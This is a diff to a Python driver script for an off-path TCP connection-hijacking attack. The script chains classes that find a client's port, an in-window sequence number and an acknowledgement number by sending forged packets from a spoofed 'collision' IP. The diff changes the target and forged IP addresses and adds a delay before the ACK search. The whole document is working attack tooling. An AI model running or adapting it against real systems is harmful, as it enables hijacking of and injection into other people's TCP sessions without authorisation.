@@ -13,17 +13,18 @@ if __name__ == '__main__':
     server_ip = '172.21.0.12'
     server_port = 3000
 
-    client_ip = '61.137.215.26'
+    client_ip = '218.24.209.39'
 
     attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.7.73'
+    collision_ip = '10.10.9.100'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                    server_port=server_port, bind_if_name=attack_bind_if,
                                    block_size=500, num_thread=2, verbose=True, reverse=True)
     connection.run()
     client_port = connection.result
+    
     if client_port == -1:
         print('No Connection Found.')
         exit(1)
@@ -34,10 +35,12 @@ if __name__ == '__main__':
                      bind_ifname=attack_bind_if, chunk_size=500, num_thread=3, verbose=True)
     seq.run()
     seq_in_win = seq.result
+    
     if seq_in_win == -1:
         print('Seq Find Miss')
         jstr = json.dumps({'res':0})
     else:
+        time.sleep(3)
         ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                          server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                          bind_if_name=attack_bind_if)
